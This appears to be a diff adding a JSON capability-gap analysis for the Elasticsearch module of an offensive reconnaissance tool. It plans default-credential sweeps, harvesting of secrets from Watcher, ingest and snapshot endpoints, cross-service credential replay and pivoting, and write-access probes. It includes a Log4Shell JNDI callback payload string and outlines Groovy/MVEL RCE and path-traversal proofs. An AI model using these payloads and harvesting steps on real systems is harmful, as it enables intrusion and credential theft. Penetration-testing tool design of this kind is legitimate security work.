@@ -1,0 +1,288 @@
+{
+  "service": "elasticsearch",
+  "existing_capabilities": [
+    "GET / banner fingerprint (name, cluster_name, version.number, lucene_version, tagline)",
+    "Unauthenticated index enumeration via GET /_cat/indices?format=json&bytes=b (index names + docs.count sum)",
+    "Cluster health via GET /_cluster/health (status, number_of_nodes)",
+    "Node OS/JVM via GET /_nodes/_local/os,jvm,settings (pretty_name, jvm.version \u2014 first node only)",
+    "Snapshot repository name list via GET /_snapshot/_all (top-level keys, capped at 20)",
+    "Plaintext-then-TLS fallback probe (unverified cert context)",
+    "Coarse EOL detection (major version < 7)",
+    "Detects 401/403 on / as 'secured' (treated as reachable-but-locked, not a finding)",
+    "Port detection on 9200/9201 and via nmap product/service string containing 'elastic'",
+    "Runbook (recon/enumerate/loot) and proof_html rendering",
+    "findings_to_vulns bridge; analyze() with budget/progress/state"
+  ],
+  "missing_capabilities": [
+    {
+      "name": "Credentials/API-key path completely absent",
+      "kind": "auth",
+      "value": "critical",
+      "description": "analyze() accepts a `creds` dict but _get() has no Authorization header \u2014 HTTP Basic, ApiKey, and Bearer tokens are all dropped on the floor. Nothing in this module ever authenticates. Consequence: default-cred sweep (elastic:changeme, elastic:elastic, kibana_system, logstash_system, apm_system, beats_system, remote_monitoring_user), cross-module cred replay (mongo/postgres/redis creds \u2192 ES), and cluster-role probing all impossible. Elasticsearch built-in users and default `changeme` are documented in the Elasticsearch Reference \u00bb 'Built-in users' and the 8.x 'Set up passwords' guide.",
+      "cwe": [
+        "CWE-798",
+        "CWE-521"
+      ],
+      "protocol_reference": "Elasticsearch Reference \u2014 'Built-in users' and 'Basic authentication' (HTTP `Authorization: Basic`/`ApiKey`/`Bearer`)"
+    },
+    {
+      "name": "Anonymous-role detection (false-negative on 'secured')",
+      "kind": "passive",
+      "value": "critical",
+      "description": "Module classifies any 401/403 on / as 'secured' and stops. Elasticsearch supports xpack.security.authc.anonymous.roles \u2014 a cluster can respond 401 to unauthenticated but grant a de-facto read role to any request via an anonymous binding, or ignore missing creds entirely. Correct probe is GET /_security/_authenticate: if effective username == '_anonymous', unauthenticated data access is available even though / returned 401. Currently a whole class of exposed clusters is scored as safe.",
+      "cwe": [
+        "CWE-284",
+        "CWE-306"
+      ],
+      "protocol_reference": "Elasticsearch Reference \u2014 'Enabling anonymous access' and /_security/_authenticate endpoint"
+    },
+    {
+      "name": "Watcher enumeration (SMTP/Slack/PagerDuty/webhook secrets)",
+      "kind": "active",
+      "value": "critical",
+      "description": "GET /_watcher/watch/_search returns watch definitions whose `actions` block routinely contains SMTP creds, Slack incoming-webhook URLs, JIRA basic-auth tokens, PagerDuty routing keys, and generic `webhook` actions with Authorization headers. This is one of the highest-value credential-exfil endpoints on any hot Elastic cluster and is not touched today.",
+      "cwe": [
+        "CWE-200",
+        "CWE-522"
+      ],
+      "protocol_reference": "Elasticsearch Reference \u2014 'Watcher APIs' / actions.{email,slack,pagerduty,webhook}"
+    },
+    {
+      "name": "Snapshot repository *config* (cloud-store hand-off)",
+      "kind": "active",
+      "value": "critical",
+      "description": "Only repository *names* are collected via /_snapshot/_all. GET /_snapshot/<name> returns the settings block: for repository-s3 that includes `bucket`, `endpoint`, `region`, `base_path`, `client` (which points at keystore-loaded IAM creds); for repository-gcs the `bucket` + `client`; for repository-azure the container + client; for fs repositories the on-disk `path.repo` value. These are direct pivots into cloud object stores and file shares and are never fetched. Additionally `_cat/snapshots/<repo>` lists snapshot IDs \u2014 required to actually restore or tamper.",
+      "cwe": [
+        "CWE-200",
+        "CWE-538"
+      ],
+      "protocol_reference": "Elasticsearch Reference \u2014 'Snapshot and Restore', 'S3/GCS/Azure repository plugins settings'"
+    },
+    {
+      "name": "Cluster settings dump (seed hosts, path.repo, remote whitelist, scripting policy)",
+      "kind": "active",
+      "value": "high",
+      "description": "GET /_cluster/settings?include_defaults=true leaks: xpack.security.enabled bit (definitive answer to the anonymous-vs-secure question), discovery.seed_hosts / cluster.initial_master_nodes (internal IPs for pivot), path.repo (filesystem paths available to snapshot arbitrary reads \u2014 the vector behind CVE-2015-5531), reindex.remote.whitelist and search.remote.* / cluster.remote.* (cross-cluster endpoints), script.allowed_types/script.allowed_contexts (whether scripting RCE remains), and action.destructive_requires_name.",
+      "cwe": [
+        "CWE-200"
+      ],
+      "protocol_reference": "Elasticsearch Reference \u2014 'Cluster get settings API' with include_defaults"
+    },
+    {
+      "name": "Ingest pipeline enumeration (embedded creds / URLs / scripts)",
+      "kind": "active",
+      "value": "high",
+      "description": "GET /_ingest/pipeline returns every ingest pipeline definition. Common leaks: `set` processors pre-filling `password`, `api_key`, `authorization`; `enrich` policies pointing at upstream indexes; `script` processors with inline Painless containing hardcoded secrets; `http` processors (in older forks) with full URL+basic-auth. High-density exfil surface, currently untouched.",
+      "cwe": [
+        "CWE-200",
+        "CWE-522"
+      ],
+      "protocol_reference": "Elasticsearch Reference \u2014 'Ingest pipeline API' and processors reference"
+    },
+    {
+      "name": "Write-access confirmation on unauthenticated cluster",
+      "kind": "active",
+      "value": "high",
+      "description": "Finding text claims 'and, on a default cluster, writable/deletable' but the module never verifies write access. A non-destructive PUT /_cluster/settings with an empty {} body, or PUT /_template/recce_probe_<rand> followed by DELETE, definitively demonstrates write. Without it the severity claim is unbacked; with it, a critical write-and-ransom finding stands separately from mere read exposure and drives ransomware-class scoring.",
+      "cwe": [
+        "CWE-284",
+        "CWE-306"
+      ],
+      "protocol_reference": "Elasticsearch Reference \u2014 'Cluster update settings' and 'Index templates' APIs; ransomware in the wild (Meow, thousands of ES clusters wiped 2020)"
+    },
+    {
+      "name": "Remote cluster / CCR pivot enumeration",
+      "kind": "active",
+      "value": "high",
+      "description": "GET /_remote/info returns every configured remote cluster (name, seed transport addresses in host:9300 form, connection mode sniff/proxy). GET /_ccr/auto_follow and GET /_ccr/stats reveal cross-cluster replication targets. These are ready-made pivot targets for the host/target list. Not consumed today.",
+      "cwe": [
+        "CWE-200"
+      ],
+      "protocol_reference": "Elasticsearch Reference \u2014 'Cross-cluster search / replication', /_remote/info, /_ccr APIs",
+      "finding_kind": "cross_service"
+    },
+    {
+      "name": "Node plugin fingerprint",
+      "kind": "passive",
+      "value": "high",
+      "description": "Deep probe reads /_nodes/_local?filter=os,jvm,settings but explicitly omits `plugins` and `modules`. The plugin list is what identifies Search Guard (its own auth CVEs \u2014 CVE-2021-32794 etc.), ReadonlyREST (auth bypasses), OpenDistro/OpenSearch security, repository-s3/gcs/azure (which drive the snapshot-config gap above), discovery-ec2/gce (cloud pivot), analysis-* forks, and mapper-attachments-legacy (tika deserialization). Also missing: /_cat/plugins gives the same list unauth in one call.",
+      "cwe": [
+        "CWE-200",
+        "CWE-1104"
+      ],
+      "protocol_reference": "Elasticsearch Reference \u2014 /_nodes/plugins and /_cat/plugins"
+    },
+    {
+      "name": "All-nodes probe (only _local queried)",
+      "kind": "passive",
+      "value": "medium",
+      "description": "_deep_es queries /_nodes/_local so it sees exactly one node (whichever routed the HTTP request) and breaks after the first. In a multi-node cluster this misses OS/JVM diversity, missed bound_addresses on the other nodes (internal pivot IPs), master identity, and JDK divergence hints. Query /_nodes/os,jvm,plugins,http,transport and iterate.",
+      "cwe": [
+        "CWE-200"
+      ],
+      "protocol_reference": "Elasticsearch Reference \u2014 Nodes info API selectors"
+    },
+    {
+      "name": "Version-to-CVE mapping is a single '<7' bucket",
+      "kind": "passive",
+      "value": "high",
+      "description": "_old_version() returns True only when the major is <7. There is no per-CVE mapping. Missed at minimum: CVE-2021-44228 Log4Shell (fixed 6.8.22 / 7.16.2 \u2014 a huge swath of 7.x is vulnerable and is scored clean today), CVE-2015-1427 Groovy sandbox, CVE-2014-3120 MVEL, CVE-2015-3337 / 2015-5531 snapshot path traversal, CVE-2019-7611 field-level security bypass, CVE-2023-31418 search DoS, CVE-2023-46673. The generic 'es_version' finding fires only for <7 and produces no CVE-specific proof.",
+      "cwe": [
+        "CWE-1104",
+        "CWE-937"
+      ],
+      "protocol_reference": "Elastic security advisories / NVD entries for each CVE"
+    },
+    {
+      "name": "Sample-document proof (POST /_search {\"size\":1})",
+      "kind": "active",
+      "value": "medium",
+      "description": "On confirmed unauth, one POST /_search {\"size\":1} against the largest non-dotfile index would return a real document as evidence \u2014 the difference between 'listed indices' and 'exfiltrated live PII'. Currently no document body ever appears in the finding, weakening both proof.py verification and report-side impact narrative.",
+      "cwe": [
+        "CWE-200"
+      ],
+      "protocol_reference": "Elasticsearch Reference \u2014 Search API, request body 'size'"
+    },
+    {
+      "name": "/_security/user, /_security/role, /_security/api_key, /_security/role_mapping",
+      "kind": "active",
+      "value": "high",
+      "description": "On a credentialed pass (see auth gap above) these enumerate every user, every role, every API key with role_descriptors + expiration, and every role-mapping rule. Even with the lowest-privilege 'monitor' cluster right several of these succeed. Also the source of stealable API keys (id + name; not the secret, but enough to correlate). Requires the auth gap fixed first.",
+      "cwe": [
+        "CWE-200",
+        "CWE-522"
+      ],
+      "protocol_reference": "Elasticsearch Reference \u2014 Security APIs"
+    },
+    {
+      "name": "9300 transport-protocol probe (native binary)",
+      "kind": "passive",
+      "value": "medium",
+      "description": "is_elasticsearch() recognises 9200/9201 only. Elasticsearch also exposes the native transport on 9300 (9301+). Historically 9300 unicast pings returned cluster name unauth and 9300 was where CVE-2015-3253 (Groovy transport) and various Java-serialization holes lived. Even fingerprinting 'transport reachable, transport TLS off' is a cross-service fact.",
+      "cwe": [
+        "CWE-200"
+      ],
+      "protocol_reference": "Elasticsearch Reference \u2014 'Modules \u00bb Transport' (default 9300-9400)"
+    },
+    {
+      "name": "WWW-Authenticate realm parsing on 401",
+      "kind": "passive",
+      "value": "medium",
+      "description": "On 401 the response's WWW-Authenticate header discriminates X-Pack ('Basic realm=\"security\" ApiKey Bearer'), Search Guard ('Basic realm=\"Search Guard\"'), ReadonlyREST ('Basic realm=\"ReadonlyREST\"'), OpenSearch security, and nginx-in-front basic auth. This drives which CVE set applies and which cred-sweep list to run. Currently 401 is opaque.",
+      "cwe": [
+        "CWE-200"
+      ],
+      "protocol_reference": "RFC 7235 \u00a74.1 WWW-Authenticate; plugin docs"
+    },
+    {
+      "name": "Broader unauth _cat surface (nodes, master, plugins, repositories, snapshots, nodeattrs, allocation, shards, aliases, templates)",
+      "kind": "active",
+      "value": "medium",
+      "description": "If /_cat/indices is unauth then the rest of /_cat/* is unauth too \u2014 one round-trip each. _cat/nodes gives node IPs+version+JDK+OS+disk; _cat/master gives master id; _cat/nodeattrs regularly leaks custom attrs like rack, az, tenant, sometimes secrets; _cat/repositories + _cat/snapshots/<repo> give backup ids and timestamps (required for restore-tamper); _cat/aliases and _cat/templates outline the data model. Cheap, uniform, currently unused apart from indices.",
+      "cwe": [
+        "CWE-200"
+      ],
+      "protocol_reference": "Elasticsearch Reference \u2014 'cat APIs'"
+    },
+    {
+      "name": "_ccr / _transform / _ml / _enrich / _slm enumeration",
+      "kind": "active",
+      "value": "medium",
+      "description": "GET /_transform (destination indexes + source queries), /_ml/anomaly_detectors (what's being monitored \u2014 often security signals: 'brute force', 'exfil detector'), /_slm/policy (snapshot lifecycle \u2192 backup cadence + destination), /_enrich/policy (upstream data joins). Reveals both the data-flow topology and, in transform 'destination' fields, downstream ES cluster credentials.",
+      "cwe": [
+        "CWE-200"
+      ],
+      "protocol_reference": "Elasticsearch Reference \u2014 Transform / Anomaly detection / SLM / Enrich APIs"
+    },
+    {
+      "name": "Stored scripts + search templates",
+      "kind": "active",
+      "value": "medium",
+      "description": "GET /_cluster/state?filter_path=metadata.stored_scripts and GET /_search_template return persisted Painless scripts and Mustache search templates. Painless bodies frequently contain hardcoded strings (branch names, tenant secrets, license keys) and reveal script-usage patterns that indicate scripting-CVE reachability. Never fetched.",
+      "cwe": [
+        "CWE-200"
+      ],
+      "protocol_reference": "Elasticsearch Reference \u2014 Stored scripts / Search template APIs"
+    },
+    {
+      "name": "License / _xpack info",
+      "kind": "passive",
+      "value": "low",
+      "description": "GET /_license and GET /_xpack reveal license tier (basic/gold/platinum/enterprise). Basic pre-6.8 = no security features by default (the entire pre-6.8 free line is open) \u2014 a positive tell for exposure. Also identifies OSS-only distributions that never had security. One GET, currently missed.",
+      "cwe": [
+        "CWE-200"
+      ],
+      "protocol_reference": "Elasticsearch Reference \u2014 License / X-Pack info APIs"
+    },
+    {
+      "name": "HTTPS is not attempted when HTTP responds",
+      "kind": "passive",
+      "value": "medium",
+      "description": "probe() breaks after the first working scheme. If HTTP 9200 answers, HTTPS 9200 is never tried \u2014 so a cluster that runs *both* an HTTP listener (unauth) and an HTTPS listener (secured) is scored as one or the other, and the misconfig (transport-HTTP dual-mode) is never surfaced. Also TLS cert chain, SANs, issuer, self-signed status, and expiry are never captured for the TLS side even when it is the responder.",
+      "cwe": [
+        "CWE-311",
+        "CWE-295"
+      ],
+      "protocol_reference": "Elasticsearch Reference \u2014 'Encrypting HTTP client communications'"
+    },
+    {
+      "name": "Log4Shell active probe",
+      "kind": "exploit",
+      "value": "high",
+      "description": "Even without version data, a User-Agent header of ${jndi:ldap://<callback>/a} on the / GET (and a body parameter on POST /_search) is a widely-effective live check for CVE-2021-44228 on 6.x/7.x < 7.16.2. Requires the OOB-callback capability (recce already has DNS/HTTP callback infra elsewhere). Not attempted.",
+      "cwe": [
+        "CWE-502",
+        "CWE-917"
+      ],
+      "protocol_reference": "CVE-2021-44228; Elastic advisory ESA-2021-31"
+    },
+    {
+      "name": "Groovy/MVEL sandbox RCE proof (CVE-2015-1427 / CVE-2014-3120)",
+      "kind": "exploit",
+      "value": "high",
+      "description": "When version confirms <=1.4.2 (MVEL) or <=1.4.4 (Groovy pre-fix), a GET /_search with script_fields.exploit.script (or the MVEL Java.lang.Runtime chain) proves RCE. Currently narrative name-drops both CVEs but no probe fires.",
+      "cwe": [
+        "CWE-94"
+      ],
+      "protocol_reference": "CVE-2014-3120 / CVE-2015-1427"
+    },
+    {
+      "name": "Snapshot path-traversal (CVE-2015-5531)",
+      "kind": "exploit",
+      "value": "high",
+      "description": "Old ES <1.6.1 with the snapshot API and a repo whose `location` contains '..' allows arbitrary file read out of path.repo. With path.repo now surfaceable via _cluster/settings (see gap above), this is a cheap active proof on any old build.",
+      "cwe": [
+        "CWE-22"
+      ],
+      "protocol_reference": "CVE-2015-5531"
+    }
+  ],
+  "priority_gaps": [
+    "Wire Authorization support into _get() and consume analyze()'s creds arg \u2014 every credentialed capability below is blocked on this, and cross-module cred replay is silently dropped today.",
+    "Add GET /_security/_authenticate as the definitive anonymous-vs-secured test \u2014 current 401='secured' classification produces false negatives on clusters with anonymous roles.",
+    "Enumerate /_watcher/watch/_search \u2014 highest-density credential-exfil endpoint on hot clusters (SMTP/Slack/PagerDuty/webhook secrets).",
+    "Fetch snapshot repository *settings* (GET /_snapshot/<name>) \u2014 surfaces S3 bucket + endpoint + base_path, GCS/Azure containers, and fs path.repo for cross-service hand-off to cloud-storage / SMB modules.",
+    "Add write-access confirmation (PUT /_cluster/settings {} or PUT+DELETE /_template/recce_probe_*) \u2014 current finding claims write/delete without proving it, so ransomware-class severity is unsupported.",
+    "Read /_cluster/settings?include_defaults=true \u2014 pulls xpack.security.enabled, discovery.seed_hosts, path.repo, reindex.remote.whitelist, cluster.remote.*, and script.allowed_types in one call; feeds pivot map and definitively resolves the security-on/off question.",
+    "Fetch /_remote/info and /_ccr/auto_follow \u2014 remote seed transport addresses feed the target list (cross-cluster pivot); not consumed today.",
+    "Add /_nodes/plugins + /_cat/plugins \u2014 identifies Search Guard / ReadonlyREST / OpenSearch security (auth-plugin CVEs) and repository-s3/gcs/azure/discovery-ec2 (cloud pivot).",
+    "Replace the coarse '<7' EOL bucket with per-CVE version matching \u2014 Log4Shell CVE-2021-44228 alone covers 6.x < 6.8.22 and 7.x < 7.16.2, currently scored clean.",
+    "Enumerate /_ingest/pipeline \u2014 'set' / 'script' / 'http' processors routinely embed hardcoded credentials and upstream URLs.",
+    "Broaden the unauth-cat sweep (_cat/nodes, master, nodeattrs, repositories, snapshots/<repo>, aliases, templates) \u2014 one round-trip each, uniform surface, currently unused.",
+    "Add a single POST /_search {\"size\":1} sample-document capture on unauth \u2014 turns 'listed indices' into 'exfiltrated live PII' proof, drives proof-verification path.",
+    "Parse WWW-Authenticate on 401 to fingerprint the security plugin (X-Pack vs Search Guard vs ReadonlyREST vs OpenSearch) \u2014 steers cred-sweep and CVE set.",
+    "Add 9300 transport-port probe (recognise, TLS-check, capture cluster-name if pingable) \u2014 separate surface from HTTP that historically had its own CVEs.",
+    "Probe HTTPS even when HTTP responds \u2014 otherwise dual-mode 'HTTP unauth + HTTPS secured' misconfigs are collapsed to one classification, and TLS cert data is never captured on TLS responders."
+  ],
+  "cross_service_wire_gaps": [
+    "snapshot_repos: only repo names collected \u2014 repo settings (S3 bucket + endpoint + region + base_path, GCS bucket, Azure container, fs path.repo) never lifted to the cloud-storage / SMB / NFS surface. Should populate a shared 'cloud_pointers' or 'storage_targets' collection consumed by S3/GCS modules and by the SMB probe (fs path.repo is often on a mounted share).",
+    "_remote/info + _ccr targets: remote-cluster seed transport addresses (host:9300 form) never fed to the host/target list \u2014 a live pivot map exists in the cluster and is discarded.",
+    "Node bound_addresses / publish_address / transport publish_address: internal IPs and non-9200/9300 ports discovered per node are not fed back to core.models.Host \u2014 misses inventory expansion.",
+    "Harvested creds (Watcher SMTP/Slack/webhook auth, ingest-pipeline 'set' processor secrets, transform destination creds, remote-cluster basic-auth): no cred-store hand-off, so they never replay against other services (SMTP, HTTP, Slack, JIRA, downstream ES).",
+    "Anonymous-role bit: even if detected via /_security/_authenticate, there is no auth-weakness matrix entry other services could consume ('cluster grants read to anonymous').",
+    "Node OS/JVM: os_name + jvm_version collected but never merged into the host-level OS fingerprint used by other services; JVM version alone gates Log4Shell / Java-serialization decisions across modules.",
+    "path.repo filesystem paths: not surfaced to SMB/NFS/local-fs modules that could then confirm the same paths are writable off-cluster.",
+    "TLS cert data on the HTTPS listener (subject, SAN, issuer, self-signed, expiry): not captured, so the shared TLS/SANs corpus other services use for VHost pivoting is missing this input."
+  ],
+  "summary": "Module is a solid unauth-fingerprint + shallow deep-enum probe but leaves a large protocol surface untouched. Two structural gaps dominate: (1) the `creds` argument is accepted and silently ignored \u2014 _get() has no Authorization path at all, so default-cred sweeps, cross-module cred replay, and every credentialed API (users, roles, api_keys, api_key metadata, per-repo snapshot settings behind auth) are impossible; (2) 401 on / is unconditionally treated as 'secured', missing anonymous-role clusters (must probe /_security/_authenticate). High-attack-value endpoints untouched: /_watcher (SMTP/Slack/webhook creds), /_snapshot/<name> (S3 bucket + endpoint), /_cluster/settings (seed hosts, path.repo, remote whitelist), /_ingest/pipeline (embedded creds), /_remote/info + /_ccr (pivot map), /_nodes/plugins (Search Guard / ReadonlyREST CVEs, cloud repo plugins). Version-to-CVE mapping is a single '<7' bucket \u2014 Log4Shell alone (fixed 6.8.22 / 7.16.2) means the current 'es_version' finding scores a huge population of vulnerable 7.x clusters as clean. Write-access is claimed in the finding text but never proven. Cross-service wire gaps: snapshot repo configs, remote seeds, node bound_addresses, harvested pipeline/watcher creds, anonymous bit, node OS/JVM, path.repo, and HTTPS cert data are all collected-or-collectable but never handed off to the modules that would consume them."
+}
